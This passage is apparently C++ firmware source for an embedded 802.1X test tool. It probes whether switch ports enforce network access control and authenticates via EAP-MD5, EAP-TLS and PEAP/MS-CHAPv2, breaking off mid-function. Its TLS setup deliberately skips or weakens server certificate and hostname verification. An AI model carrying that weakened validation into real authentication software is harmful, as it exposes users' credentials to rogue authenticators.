#include "dot1x.h"
#include "../include/config.h"
#include "packet.h"
#include "weblog.h"
#include "mschapv2.h"
#include "net_util.h"
#include <MD5Builder.h>
#include <esp_random.h>
#include <string.h>

#include <mbedtls/ssl.h>
#include <mbedtls/entropy.h>
#include <mbedtls/ctr_drbg.h>
#include <mbedtls/x509_crt.h>
#include <mbedtls/pk.h>
#include <mbedtls/error.h>

// Tee output to the web capture buffer (matches the other test modules).
#define Serial Out

// =============================================================================
// EAPOL / EAP constants
// =============================================================================
static const uint8_t  PAE_GROUP_MAC[6] = { 0x01, 0x80, 0xC2, 0x00, 0x00, 0x03 };
static const uint16_t ETHERTYPE_EAPOL  = 0x888E;
static const uint8_t  EAPOL_VERSION    = 0x01;   // 802.1X-2001 (widely accepted)

// EAPOL packet types
static const uint8_t EAPOL_EAP    = 0x00;
static const uint8_t EAPOL_START  = 0x01;
static const uint8_t EAPOL_LOGOFF = 0x02;

// EAP codes
static const uint8_t EAP_REQUEST  = 1;
static const uint8_t EAP_RESPONSE = 2;
static const uint8_t EAP_SUCCESS  = 3;
static const uint8_t EAP_FAILURE  = 4;

// EAP method types
static const uint8_t EAP_IDENTITY = 1;
static const uint8_t EAP_NAK      = 3;
static const uint8_t EAP_MD5      = 4;
static const uint8_t EAP_TLS      = 13;
static const uint8_t EAP_PEAP     = 25;
static const uint8_t EAP_TTLS     = 21;
static const uint8_t EAP_MSCHAPV2 = 26;
static const uint8_t EAP_TLV      = 33;

// EAP-TLS flag bits (RFC 5216 section 3.1)
static const uint8_t EAPTLS_FLAG_L = 0x80;   // TLS message length present
static const uint8_t EAPTLS_FLAG_M = 0x40;   // more fragments follow
static const uint8_t EAPTLS_FLAG_S = 0x20;   // EAP-TLS start

// =============================================================================
// File-local TX helper: wrap an EAPOL body in an Ethernet frame and send it.
// =============================================================================
static bool sendEapolFrame(W5500Raw &eth, const uint8_t mac[6],
                           uint8_t eapolType, const uint8_t *body, uint16_t bodyLen,
                           const uint8_t *dstMac = nullptr)
{
    uint8_t f[ETH_MIN_LEN + 256];
    memset(f, 0, sizeof(f));

    memcpy(f,     dstMac ? dstMac : PAE_GROUP_MAC, 6); // DA
    memcpy(f + 6, mac,           6);          // SA: our MAC
    f[12] = (uint8_t)(ETHERTYPE_EAPOL >> 8);
    f[13] = (uint8_t)(ETHERTYPE_EAPOL & 0xFF);
    f[14] = EAPOL_VERSION;
    f[15] = eapolType;
    f[16] = (uint8_t)(bodyLen >> 8);
    f[17] = (uint8_t)(bodyLen & 0xFF);
    if (body && bodyLen) memcpy(f + 18, body, bodyLen);

    uint16_t len = 18 + bodyLen;
    if (len < ETH_MIN_LEN) len = ETH_MIN_LEN; // pad short frames (zero-filled)
    return eth.sendFrame(f, len);
}

// =============================================================================
// Construction
// =============================================================================
Dot1xTest::Dot1xTest(W5500Raw &eth, const uint8_t mac[6])
    : _eth(eth), _hasTarget(false)
{
    memcpy(_mac, mac, 6);
    memset(_target, 0, 6);
}

void Dot1xTest::setTarget(const uint8_t dstMac[6])
{
    if (!dstMac) { _hasTarget = false; memset(_target, 0, 6); return; }
    // Check for all-zeros
    bool allZero = true;
    for (int i = 0; i < 6; i++) if (dstMac[i]) { allZero = false; break; }
    if (allZero) { _hasTarget = false; memset(_target, 0, 6); return; }
    memcpy(_target, dstMac, 6);
    _hasTarget = true;
}

const char *Dot1xTest::_methodName(uint8_t type)
{
    switch (type) {
        case 1:  return "Identity";
        case 2:  return "Notification";
        case 3:  return "Legacy-Nak";
        case 4:  return "MD5-Challenge";
        case 6:  return "GTC";
        case 13: return "EAP-TLS";
        case 17: return "LEAP";
        case 21: return "EAP-TTLS";
        case 25: return "PEAP";
        case 43: return "EAP-FAST";
        default: return "unknown";
    }
}

// =============================================================================
// TX helpers
// =============================================================================
bool Dot1xTest::_sendEapolStart()
{
    return sendEapolFrame(_eth, _mac, EAPOL_START, nullptr, 0,
                          _hasTarget ? _target : nullptr);
}

bool Dot1xTest::_sendEapolLogoff()
{
    return sendEapolFrame(_eth, _mac, EAPOL_LOGOFF, nullptr, 0,
                          _hasTarget ? _target : nullptr);
}

bool Dot1xTest::_sendEap(uint8_t code, uint8_t id, uint8_t type,
                         const uint8_t *data, uint16_t dataLen)
{
    uint8_t  eap[5 + 256];
    uint16_t eapLen = 5 + dataLen;           // code+id+len(2)+type + data
    if (eapLen > sizeof(eap)) return false;

    eap[0] = code;
    eap[1] = id;
    eap[2] = (uint8_t)(eapLen >> 8);
    eap[3] = (uint8_t)(eapLen & 0xFF);
    eap[4] = type;
    if (data && dataLen) memcpy(eap + 5, data, dataLen);

    return sendEapolFrame(_eth, _mac, EAPOL_EAP, eap, eapLen,
                          _hasTarget ? _target : nullptr);
}

// =============================================================================
// RX helper: wait for an EAPOL EAP-Packet within timeoutMs.
// Returns EAP length (>0), 0 on timeout, -1 if aborted from the console.
// =============================================================================
int Dot1xTest::_recvEap(uint8_t *eap, uint16_t maxLen, uint32_t timeoutMs)
{
    static uint8_t buf[ETH_MAX_LEN + 4];
    uint32_t deadline = millis() + timeoutMs;

    while ((int32_t)(deadline - millis()) > 0) {
        uint16_t len = _eth.recvFrame(buf, sizeof(buf));
        if (len >= 18 && buf[12] == 0x88 && buf[13] == 0x8E) {
            uint8_t  eapolType = buf[15];
            uint16_t bodyLen   = ((uint16_t)buf[16] << 8) | buf[17];
            if (eapolType == EAPOL_EAP) {
                uint16_t avail = len - 18;
                if (bodyLen > avail)   bodyLen = avail;
                if (bodyLen > maxLen)  bodyLen = maxLen;
                memcpy(eap, buf + 18, bodyLen);
                return (int)bodyLen;
            }
            // Other EAPOL types (e.g. EAPOL-Key) are ignored; keep listening.
        }
        if (Serial.available()) {
            while (Serial.available()) Serial.read();   // drain abort key
            return -1;
        }
        delay(1);
    }
    return 0;   // timeout
}

// =============================================================================
// probe — detect whether the port enforces 802.1X (no credentials sent)
// =============================================================================
bool Dot1xTest::probe(uint32_t timeoutMs, Dot1xResult *res)
{
    Dot1xResult local;
    memset(&local, 0, sizeof(local));

    char macStr[18];
    macToStr(_mac, macStr);
    Serial.printf("\r\n802.1X probe (supplicant MAC %s)...\r\n", macStr);
    Serial.println("Sending EAPOL-Start, waiting for authenticator (any key aborts)...");

    uint32_t deadline = millis() + timeoutMs;
    uint8_t  eap[256];
    int      starts = 0;

    _sendEapolStart(); starts++;

    while ((int32_t)(deadline - millis()) > 0) {
        uint32_t remain = deadline - millis();
        int n = _recvEap(eap, sizeof(eap), remain > 1500 ? 1500 : remain);
        if (n < 0) { Serial.println("Aborted."); break; }
        if (n == 0) {
            if (starts < 3) { _sendEapolStart(); starts++; continue; }
            break;
        }
        if (n < 4) continue;

        uint8_t code = eap[0];
        uint8_t type = (n >= 5) ? eap[4] : 0;
        if (code == EAP_REQUEST) {
            local.portEnforced  = true;
            local.offeredMethod = type;
            Serial.printf("EAP-Request received: type %u (%s)\r\n", type, _methodName(type));
            Serial.println("=> Port ENFORCES 802.1X (NAC active).");
            break;
        } else if (code == EAP_SUCCESS) {
            local.portEnforced = true;  local.authenticated = true; break;
        } else if (code == EAP_FAILURE) {
            local.portEnforced = true;  local.rejected = true; break;
        }
    }

    if (!local.portEnforced) {
        Serial.println("=> No EAP request seen: port is OPEN (no 802.1X) or MAB-only.");
        strncpy(local.detail, "open / no 802.1X", sizeof(local.detail) - 1);
    } else {
        snprintf(local.detail, sizeof(local.detail),
                 "dot1x enforced (offered %s)", _methodName(local.offeredMethod));
    }

    if (res) *res = local;
    return local.portEnforced;
}

// =============================================================================
// authenticate — full EAP-MD5 supplicant exchange
// =============================================================================
bool Dot1xTest::authenticate(const char *username, const char *password,
                             uint32_t timeoutMs, Dot1xResult *res)
{
    Dot1xResult local;
    memset(&local, 0, sizeof(local));

    if (!username || !username[0]) {
        Serial.println("802.1X: no username set (use 'dot1x user <name>').");
        if (res) *res = local;
        return false;
    }

    Serial.printf("\r\n802.1X authentication as '%s' (EAP-MD5)...\r\n", username);
    Serial.println("(any key aborts)");

    uint32_t deadline = millis() + timeoutMs;
    uint8_t  eap[256];
    int      starts = 0;
    int      iter   = 0;

    _sendEapolStart(); starts++;

    while ((int32_t)(deadline - millis()) > 0 && iter++ < 24) {
        uint32_t remain = deadline - millis();
        int n = _recvEap(eap, sizeof(eap), remain > 1500 ? 1500 : remain);
        if (n < 0) { Serial.println("Aborted."); break; }
        if (n == 0) {
            if (!local.portEnforced && starts < 3) { _sendEapolStart(); starts++; continue; }
            break;
        }
        if (n < 4) continue;

        uint8_t code = eap[0];
        uint8_t id   = eap[1];
        uint8_t type = (n >= 5) ? eap[4] : 0;

        if (code == EAP_REQUEST) {
            local.portEnforced = true;

            if (type == EAP_IDENTITY) {
                Serial.println("<- EAP-Request/Identity");
                _sendEap(EAP_RESPONSE, id, EAP_IDENTITY,
                         (const uint8_t *)username, strlen(username));
                local.identitySent = true;
                Serial.printf("-> EAP-Response/Identity '%s'\r\n", username);

            } else if (type == EAP_MD5) {
                local.offeredMethod = EAP_MD5;
                Serial.println("<- EAP-Request/MD5-Challenge");
                if (n < 6) continue;
                uint8_t vsize = eap[5];
                if (vsize > n - 6) vsize = n - 6;        // clamp to available

                // MD5(id || password || challenge)
                uint8_t digest[16];
                MD5Builder md5;
                md5.begin();
                uint8_t idByte = id;
                md5.add(&idByte, 1);
                md5.add((uint8_t *)password, (uint16_t)strlen(password));
                md5.add(eap + 6, vsize);
                md5.calculate();
                md5.getBytes(digest);

                // Response: [value-size=16][digest(16)][username]
                uint8_t data[1 + 16 + 33];
                data[0] = 16;
                memcpy(data + 1, digest, 16);
                uint16_t ulen = strlen(username);
                if (ulen > 32) ulen = 32;
                memcpy(data + 17, username, ulen);
                _sendEap(EAP_RESPONSE, id, EAP_MD5, data, 17 + ulen);
                Serial.println("-> EAP-Response/MD5-Challenge");

            } else {
                local.offeredMethod = type;
                Serial.printf("<- EAP-Request/%s (type %u) -- not supported, sending NAK->MD5\r\n",
                              _methodName(type), type);
                uint8_t desired = EAP_MD5;
                _sendEap(EAP_RESPONSE, id, EAP_NAK, &desired, 1);
            }

        } else if (code == EAP_SUCCESS) {
            local.portEnforced = local.authenticated = true;
            Serial.println("<- EAP-Success");
            break;
        } else if (code == EAP_FAILURE) {
            local.portEnforced = true;
            local.rejected = true;
            Serial.println("<- EAP-Failure");
            break;
        }
    }

    if (local.authenticated) {
        Serial.println("=> AUTH SUCCESS: credentials accepted, port authorized.");
        strncpy(local.detail, "authenticated", sizeof(local.detail) - 1);
    } else if (local.rejected) {
        Serial.println("=> AUTH FAILED: authenticator rejected the credentials.");
        strncpy(local.detail, "rejected", sizeof(local.detail) - 1);
    } else if (!local.portEnforced) {
        Serial.println("=> No response: port is OPEN (no 802.1X) or supplicant filtered.");
        strncpy(local.detail, "open / no 802.1X", sizeof(local.detail) - 1);
    } else {
        Serial.println("=> INCOMPLETE: dot1x present but no Success/Failure (check EAP method).");
        snprintf(local.detail, sizeof(local.detail),
                 "incomplete (offered %s)", _methodName(local.offeredMethod));
    }

    if (res) *res = local;
    return local.authenticated;
}

// =============================================================================
// EAP-TLS  --  certificate-based AAA authentication (RFC 5216)
// =============================================================================

// Largest TLS-record fragment carried in a single EAP-TLS packet. Kept well
// under the 1514-byte L2 MTU once Ethernet + EAPOL + EAP headers are added.
static const uint16_t EAPTLS_FRAG_MAX = 1000;
// Reassembly / flight buffer size (server certificate chains can be large).
static const size_t   EAPTLS_BUF_SIZE = 8192;

// Send an EAP-Response/EAP-TLS packet directly (own frame buffer so it can be
// larger than the small EAP-MD5 path).
bool Dot1xTest::_sendEapTls(uint8_t id, uint8_t flags, bool includeLen,
                            uint32_t totalLen, const uint8_t *data, uint16_t dataLen,
                            uint8_t methodType)
{
    static uint8_t f[18 + 5 + 5 + EAPTLS_FRAG_MAX + 8];
    memset(f, 0, 18);
    memcpy(f,     _hasTarget ? _target : PAE_GROUP_MAC, 6);
    memcpy(f + 6, _mac,          6);
    f[12] = (uint8_t)(ETHERTYPE_EAPOL >> 8);
    f[13] = (uint8_t)(ETHERTYPE_EAPOL & 0xFF);
    f[14] = EAPOL_VERSION;
    f[15] = EAPOL_EAP;

    if (includeLen) flags |= EAPTLS_FLAG_L;

    uint16_t eapLen = 5 + 1 + (includeLen ? 4 : 0) + dataLen;  // hdr+type+flags[+len]+data
    f[16] = (uint8_t)(eapLen >> 8);
    f[17] = (uint8_t)(eapLen & 0xFF);

    uint8_t *e = f + 18;
    e[0] = EAP_RESPONSE;
    e[1] = id;
    e[2] = (uint8_t)(eapLen >> 8);
    e[3] = (uint8_t)(eapLen & 0xFF);
    e[4] = methodType;
    uint16_t off = 5;
    e[off++] = flags;
    if (includeLen) {
        e[off++] = (uint8_t)(totalLen >> 24);
        e[off++] = (uint8_t)(totalLen >> 16);
        e[off++] = (uint8_t)(totalLen >> 8);
        e[off++] = (uint8_t)(totalLen);
    }
    if (data && dataLen) { memcpy(e + off, data, dataLen); off += dataLen; }

    uint16_t frameLen = 18 + off;
    if (frameLen < ETH_MIN_LEN) frameLen = ETH_MIN_LEN;
    return _eth.sendFrame(f, frameLen);
}

// Non-blocking BIO context bridging mbedTLS <-> EAP-TLS fragmentation buffers.
namespace {
struct EapTlsIo {
    uint8_t *tx;  size_t txLen;  size_t txSent;  size_t txCap;  // outgoing flight
    uint8_t *rx;  size_t rxLen;  size_t rxPos;   size_t rxCap;  // incoming flight
};

int tlsBioSend(void *ctx, const unsigned char *buf, size_t len)
{
    EapTlsIo *io = static_cast<EapTlsIo *>(ctx);
    if (io->txLen + len > io->txCap) return MBEDTLS_ERR_SSL_INTERNAL_ERROR;
    memcpy(io->tx + io->txLen, buf, len);
    io->txLen += len;
    return (int)len;
}

int tlsBioRecv(void *ctx, unsigned char *buf, size_t len)
{
    EapTlsIo *io = static_cast<EapTlsIo *>(ctx);
    size_t avail = io->rxLen - io->rxPos;
    if (avail == 0) return MBEDTLS_ERR_SSL_WANT_READ;
    size_t n = (len < avail) ? len : avail;
    memcpy(buf, io->rx + io->rxPos, n);
    io->rxPos += n;
    return (int)n;
}
} // namespace

bool Dot1xTest::authenticateTls(const char *identity,
                                const char *caPem,
                                const char *clientPem,
                                const char *keyPem,
                                const char *keyPwd,
                                uint32_t timeoutMs, Dot1xResult *res)
{
    Dot1xResult local;
    memset(&local, 0, sizeof(local));

    if (!clientPem || !clientPem[0] || !keyPem || !keyPem[0]) {
        Serial.println("EAP-TLS: client certificate and private key are required.");
        strncpy(local.detail, "missing client cert/key", sizeof(local.detail) - 1);
        if (res) *res = local;
        return false;
    }

    const char *id = (identity && identity[0]) ? identity : "anonymous";
    Serial.printf("\r\n802.1X authentication as '%s' (EAP-TLS)...\r\n", id);
    Serial.println("(any key aborts)");

    // ---- mbedTLS setup -------------------------------------------------------
    mbedtls_entropy_context  entropy;
    mbedtls_ctr_drbg_context drbg;
    mbedtls_ssl_context      ssl;
    mbedtls_ssl_config       conf;
    mbedtls_x509_crt         cacert;
    mbedtls_x509_crt         clicert;
    mbedtls_pk_context       pkey;

    mbedtls_entropy_init(&entropy);
    mbedtls_ctr_drbg_init(&drbg);
    mbedtls_ssl_init(&ssl);
    mbedtls_ssl_config_init(&conf);
    mbedtls_x509_crt_init(&cacert);
    mbedtls_x509_crt_init(&clicert);
    mbedtls_pk_init(&pkey);

    EapTlsIo io;
    memset(&io, 0, sizeof(io));
    io.tx = (uint8_t *)malloc(EAPTLS_BUF_SIZE);
    io.rx = (uint8_t *)malloc(EAPTLS_BUF_SIZE);
    io.txCap = io.rxCap = EAPTLS_BUF_SIZE;

    char errbuf[96];
    bool fatal = false;
    int  ret   = 0;

    auto fail = [&](const char *what, int code) {
        if (code) {
            mbedtls_strerror(code, errbuf, sizeof(errbuf));
            Serial.printf("EAP-TLS: %s failed: -0x%04X %s\r\n", what, -code, errbuf);
            snprintf(local.detail, sizeof(local.detail), "%s err", what);
        } else {
            Serial.printf("EAP-TLS: %s\r\n", what);
            strncpy(local.detail, what, sizeof(local.detail) - 1);
        }
        fatal = true;
    };

    if (!io.tx || !io.rx) { fail("buffer alloc", 0); }

    if (!fatal) {
        ret = mbedtls_ctr_drbg_seed(&drbg, mbedtls_entropy_func, &entropy,
                                    (const unsigned char *)"esp32-eaptls", 12);
        if (ret) fail("rng seed", ret);
    }

    bool haveCa = (caPem && caPem[0]);
    if (!fatal && haveCa) {
        ret = mbedtls_x509_crt_parse(&cacert, (const unsigned char *)caPem,
                                     strlen(caPem) + 1);
        if (ret) fail("CA parse", ret);
    }
    if (!fatal) {
        ret = mbedtls_x509_crt_parse(&clicert, (const unsigned char *)clientPem,
                                     strlen(clientPem) + 1);
        if (ret) fail("client cert parse", ret);
    }
    if (!fatal) {
        size_t pwdLen = (keyPwd && keyPwd[0]) ? strlen(keyPwd) : 0;
        ret = mbedtls_pk_parse_key(&pkey, (const unsigned char *)keyPem,
                                   strlen(keyPem) + 1,
                                   pwdLen ? (const unsigned char *)keyPwd : nullptr,
                                   pwdLen,
                                   mbedtls_ctr_drbg_random, &drbg);
        if (ret) fail("private key parse", ret);
    }
    if (!fatal) {
        ret = mbedtls_ssl_config_defaults(&conf, MBEDTLS_SSL_IS_CLIENT,
                                          MBEDTLS_SSL_TRANSPORT_STREAM,
                                          MBEDTLS_SSL_PRESET_DEFAULT);
        if (ret) fail("ssl config", ret);
    }
    if (!fatal) {
        // EAP-TLS is almost universally TLS 1.2 on RADIUS servers.
        mbedtls_ssl_conf_min_tls_version(&conf, MBEDTLS_SSL_VERSION_TLS1_2);
        mbedtls_ssl_conf_max_tls_version(&conf, MBEDTLS_SSL_VERSION_TLS1_2);
        mbedtls_ssl_conf_rng(&conf, mbedtls_ctr_drbg_random, &drbg);
        // Validate the server cert when a CA is supplied; otherwise proceed and
        // report what was presented (test tool behaviour).
        mbedtls_ssl_conf_authmode(&conf,
            haveCa ? MBEDTLS_SSL_VERIFY_OPTIONAL : MBEDTLS_SSL_VERIFY_NONE);
        if (haveCa) mbedtls_ssl_conf_ca_chain(&conf, &cacert, nullptr);
        ret = mbedtls_ssl_conf_own_cert(&conf, &clicert, &pkey);
        if (ret) fail("own cert", ret);
    }
    if (!fatal) {
        ret = mbedtls_ssl_setup(&ssl, &conf);
        if (ret) fail("ssl setup", ret);
    }
    if (!fatal) {
        mbedtls_ssl_set_hostname(&ssl, nullptr);   // no SNI / no name check
        mbedtls_ssl_set_bio(&ssl, &io, tlsBioSend, tlsBioRecv, nullptr);
    }

    // ---- EAP state machine ---------------------------------------------------
    bool handshakeDone = false;
    bool started       = false;        // EAP-TLS handshake kicked off
    uint8_t eap[EAPTLS_FRAG_MAX + 64];
    uint32_t deadline = millis() + timeoutMs;
    int starts = 0;

    // Advance the TLS handshake one flight; whatever mbedTLS emits ends up in
    // io.tx ready to be fragmented onto the wire.
    auto driveHandshake = [&]() -> int {
        io.txLen = io.txSent = 0;
        int r = mbedtls_ssl_handshake(&ssl);
        io.rxLen = io.rxPos = 0;       // current peer flight consumed
        if (r == 0) handshakeDone = true;
        return r;
    };

    // Transmit the next pending fragment of our current flight.
    auto sendTxFragment = [&](uint8_t pid) {
        size_t remaining = io.txLen - io.txSent;
        size_t frag = (remaining > EAPTLS_FRAG_MAX) ? EAPTLS_FRAG_MAX : remaining;
        bool   more = (frag < remaining);
        bool   first = (io.txSent == 0);
        bool   incLen = first && (io.txLen > EAPTLS_FRAG_MAX);
        uint8_t flags = more ? EAPTLS_FLAG_M : 0;
        _sendEapTls(pid, flags, incLen, (uint32_t)io.txLen,
                    io.tx + io.txSent, (uint16_t)frag);
        io.txSent += frag;
    };

    // Emit our flight (or an empty ACK if mbedTLS produced nothing).
    auto sendFlightOrAck = [&](uint8_t pid) {
        if (io.txLen > 0) { io.txSent = 0; sendTxFragment(pid); }
        else              { _sendEapTls(pid, 0, false, 0, nullptr, 0); }
    };

    if (!fatal) { _sendEapolStart(); starts++; }

    while (!fatal && (int32_t)(deadline - millis()) > 0) {
        uint32_t remain = deadline - millis();
        int n = _recvEap(eap, sizeof(eap), remain > 2000 ? 2000 : remain);
        if (n < 0) { Serial.println("Aborted."); break; }
        if (n == 0) {
            if (!started && !local.portEnforced && starts < 3) {
                _sendEapolStart(); starts++;
            }
            continue;
        }
        if (n < 4) continue;

        uint8_t code = eap[0];
        uint8_t pid  = eap[1];
        uint8_t type = (n >= 5) ? eap[4] : 0;

        if (code == EAP_SUCCESS) {
            local.portEnforced = local.authenticated = true;
            Serial.println("<- EAP-Success");
            break;
        }
        if (code == EAP_FAILURE) {
            local.portEnforced = true; local.rejected = true;
            Serial.println("<- EAP-Failure");
            break;
        }
        if (code != EAP_REQUEST) continue;

        local.portEnforced = true;

        if (type == EAP_IDENTITY) {
            Serial.println("<- EAP-Request/Identity");
            _sendEap(EAP_RESPONSE, pid, EAP_IDENTITY,
                     (const uint8_t *)id, strlen(id));
            local.identitySent = true;
            Serial.printf("-> EAP-Response/Identity '%s'\r\n", id);
            continue;
        }

        if (type != EAP_TLS) {
            local.offeredMethod = type;
            Serial.printf("<- EAP-Request/%s (type %u) -- NAK -> EAP-TLS\r\n",
                          _methodName(type), type);
            uint8_t desired = EAP_TLS;
            _sendEap(EAP_RESPONSE, pid, EAP_NAK, &desired, 1);
            continue;
        }

        // ---- EAP-TLS packet ----
        local.offeredMethod = EAP_TLS;
        if (n < 6) continue;
        uint8_t  flags   = eap[5];
        uint16_t dataOff = 6;
        if (flags & EAPTLS_FLAG_L) dataOff += 4;      // skip TLS-length field
        int dataLen = (n > dataOff) ? (n - dataOff) : 0;

        if (flags & EAPTLS_FLAG_S) {
            // Start: launch the handshake (produces ClientHello).
            Serial.println("<- EAP-TLS Start");
            started = true;
            ret = driveHandshake();
            if (ret != 0 && ret != MBEDTLS_ERR_SSL_WANT_READ) { fail("handshake", ret); break; }
            sendFlightOrAck(pid);
            continue;
        }

        if (dataLen > 0) {
            // Peer flight fragment: append to reassembly buffer.
            if (io.rxLen + dataLen > io.rxCap) { fail("rx overflow", 0); break; }
            memcpy(io.rx + io.rxLen, eap + dataOff, dataLen);
            io.rxLen += dataLen;

            if (flags & EAPTLS_FLAG_M) {
                _sendEapTls(pid, 0, false, 0, nullptr, 0);   // ACK, expect more
                continue;
            }
            // Complete flight -> feed mbedTLS.
            io.rxPos = 0;
            ret = driveHandshake();
            if (ret != 0 && ret != MBEDTLS_ERR_SSL_WANT_READ) { fail("handshake", ret); break; }
            sendFlightOrAck(pid);
            continue;
        }

        // Empty EAP-TLS request: either an ACK of our fragment or a final ACK.
        if (io.txSent < io.txLen) {
            sendTxFragment(pid);
        } else {
            _sendEapTls(pid, 0, false, 0, nullptr, 0);
        }
    }

    // ---- Report --------------------------------------------------------------
    if (local.authenticated) {
        Serial.println("=> AUTH SUCCESS: EAP-TLS handshake accepted, port authorized.");
        const char *cs = mbedtls_ssl_get_ciphersuite(&ssl);
        if (cs) Serial.printf("   Cipher suite : %s\r\n", cs);
        if (haveCa) {
            uint32_t vr = mbedtls_ssl_get_verify_result(&ssl);
            Serial.printf("   Server cert  : %s\r\n",
                          vr == 0 ? "validated against CA" : "NOT validated (see flags)");
        }
        const mbedtls_x509_crt *peer = mbedtls_ssl_get_peer_cert(&ssl);
        if (peer) {
            char dn[128];
            if (mbedtls_x509_dn_gets(dn, sizeof(dn), &peer->subject) > 0)
                Serial.printf("   Server subj  : %s\r\n", dn);
        }
        strncpy(local.detail, "EAP-TLS authenticated", sizeof(local.detail) - 1);
    } else if (local.rejected) {
        Serial.println("=> AUTH FAILED: authenticator rejected the certificate.");
        if (!local.detail[0]) strncpy(local.detail, "rejected", sizeof(local.detail) - 1);
    } else if (fatal) {
        Serial.println("=> EAP-TLS ERROR: handshake could not complete (see above).");
    } else if (!local.portEnforced) {
        Serial.println("=> No response: port is OPEN (no 802.1X) or supplicant filtered.");
        strncpy(local.detail, "open / no 802.1X", sizeof(local.detail) - 1);
    } else {
        Serial.println("=> INCOMPLETE: dot1x present but handshake did not finish (timeout).");
        if (!local.detail[0]) strncpy(local.detail, "incomplete", sizeof(local.detail) - 1);
    }

    // ---- Cleanup -------------------------------------------------------------
    if (io.tx) free(io.tx);
    if (io.rx) free(io.rx);
    mbedtls_ssl_free(&ssl);
    mbedtls_ssl_config_free(&conf);
    mbedtls_x509_crt_free(&cacert);
    mbedtls_x509_crt_free(&clicert);
    mbedtls_pk_free(&pkey);
    mbedtls_ctr_drbg_free(&drbg);
    mbedtls_entropy_free(&entropy);

    if (res) *res = local;
    return local.authenticated;
}

// =============================================================================
// PEAPv0  --  EAP-MSCHAPv2 inner authentication (RFC 2759)
//
// Establishes a server-authenticated TLS 1.2 tunnel (no client certificate),
// then carries inner EAP packets as TLS application data: Identity ->
// MS-CHAPv2 challenge/response -> Success -> EAP-TLV result. The same EAPOL
// fragmentation and BIO plumbing used by EAP-TLS is reused here, with the EAP
// method type set to PEAP (25).
// =============================================================================
bool Dot1xTest::authenticatePeap(const char *identity, const char *username,
                                 const char *password, const char *caPem,
                                 uint32_t timeoutMs, Dot1xResult *res)
{
    Dot1xResult local;
    memset(&local, 0, sizeof(local));

    if (!username || !username[0] || !password) {
        Serial.println("PEAP: inner username and password are required.");
        strncpy(local.detail, "missing credentials", sizeof(local.detail) - 1);
        if (res) *res = local;
        return false;
    }

    const char *outerId = (identity && identity[0]) ? identity : "anonymous";
    Serial.printf("\r\n802.1X authentication (PEAPv0/EAP-MSCHAPv2)\r\n"
                  "   outer identity : %s\r\n   inner username : %s\r\n",
                  outerId, username);
    Serial.println("(any key aborts)");

    // ---- mbedTLS setup (server auth only, no client certificate) -------------
    mbedtls_entropy_context  entropy;
    mbedtls_ctr_drbg_context drbg;
    mbedtls_ssl_context      ssl;
    mbedtls_ssl_config       conf;
    mbedtls_x509_crt         cacert;

    mbedtls_entropy_init(&entropy);
    mbedtls_ctr_drbg_init(&drbg);
    mbedtls_ssl_init(&ssl);
    mbedtls_ssl_config_init(&conf);
    mbedtls_x509_crt_init(&cacert);

    EapTlsIo io;
    memset(&io, 0, sizeof(io));
    io.tx = (uint8_t *)malloc(EAPTLS_BUF_SIZE);
    io.rx = (uint8_t *)malloc(EAPTLS_BUF_SIZE);
    io.txCap = io.rxCap = EAPTLS_BUF_SIZE;

    char errbuf[96];
    bool fatal = false;
    int  ret   = 0;

    auto fail = [&](const char *what, int code) {
        if (code) {
            mbedtls_strerror(code, errbuf, sizeof(errbuf));
            Serial.printf("PEAP: %s failed: -0x%04X %s\r\n", what, -code, errbuf);
            snprintf(local.detail, sizeof(local.detail), "%s err", what);
        } else {
            Serial.printf("PEAP: %s\r\n", what);
            strncpy(local.detail, what, sizeof(local.detail) - 1);
        }
        fatal = true;
    };

    if (!io.tx || !io.rx) fail("buffer alloc", 0);

    if (!fatal) {
        ret = mbedtls_ctr_drbg_seed(&drbg, mbedtls_entropy_func, &entropy,
                                    (const unsigned char *)"esp32-peap", 10);
        if (ret) fail("rng seed", ret);
    }

    bool haveCa = (caPem && caPem[0]);
    if (!fatal && haveCa) {
        ret = mbedtls_x509_crt_parse(&cacert, (const unsigned char *)caPem,
                                     strlen(caPem) + 1);
        if (ret) fail("CA parse", ret);
    }
    if (!fatal) {
        ret = mbedtls_ssl_config_defaults(&conf, MBEDTLS_SSL_IS_CLIENT,
                                          MBEDTLS_SSL_TRANSPORT_STREAM,
                                          MBEDTLS_SSL_PRESET_DEFAULT);
        if (ret) fail("ssl config", ret);
    }
    if (!fatal) {
        mbedtls_ssl_conf_min_tls_version(&conf, MBEDTLS_SSL_VERSION_TLS1_2);
        mbedtls_ssl_conf_max_tls_version(&conf, MBEDTLS_SSL_VERSION_TLS1_2);
        mbedtls_ssl_conf_rng(&conf, mbedtls_ctr_drbg_random, &drbg);
        mbedtls_ssl_conf_authmode(&conf,
            haveCa ? MBEDTLS_SSL_VERIFY_OPTIONAL : MBEDTLS_SSL_VERIFY_NONE);
        if (haveCa) mbedtls_ssl_conf_ca_chain(&conf, &cacert, nullptr);
    }
    if (!fatal) {
        ret = mbedtls_ssl_setup(&ssl, &conf);
        if (ret) fail("ssl setup", ret);
    }
    if (!fatal) {
        mbedtls_ssl_set_hostname(&ssl, nullptr);
        mbedtls_ssl_set_bio(&ssl, &io, tlsBioSend, tlsBioRecv, nullptr);
    }

    // ---- inner MS-CHAPv2 state ----------------------------------------------
    uint8_t  ntResponse[24];
    uint8_t  peerChallenge[16];
    char     authRespStr[43] = {0};        // expected "S=..." from server
    bool     innerDone = false;

    // Build the inner EAP-Response for a decrypted inner EAP-Request.
    // Returns reply length (0 => send empty ACK), updates local/innerDone.
    auto buildInner = [&](const uint8_t *in, int inLen,
                          uint8_t *out, int outCap) -> int {
        if (inLen < 4) return 0;
        uint8_t icode = in[0];
        uint8_t iid   = in[1];
        uint8_t itype = (inLen >= 5) ? in[4] : 0;
        if (icode != EAP_REQUEST) return 0;

        // --- inner EAP-Request/Identity ---
        if (itype == EAP_IDENTITY) {
            Serial.println("   <- inner EAP-Request/Identity");
            size_t ul = strlen(username);
            int len = 5 + (int)ul;
            if (len > outCap) return 0;
            out[0] = EAP_RESPONSE; out[1] = iid;
            out[2] = (uint8_t)(len >> 8); out[3] = (uint8_t)len;
            out[4] = EAP_IDENTITY;
            memcpy(out + 5, username, ul);
            Serial.printf("   -> inner EAP-Response/Identity '%s'\r\n", username);
            return len;
        }

        // --- inner EAP-Request/EAP-MSCHAPv2 ---
        if (itype == EAP_MSCHAPV2) {
            if (inLen < 6) return 0;
            uint8_t opcode = in[5];

            if (opcode == 1) {                     // Challenge
                if (inLen < 10) return 0;
                uint8_t mschapId  = in[6];
                uint8_t valueSize = in[9];
                if (valueSize != 16 || inLen < 10 + 16) return 0;
                const uint8_t *authChallenge = in + 10;
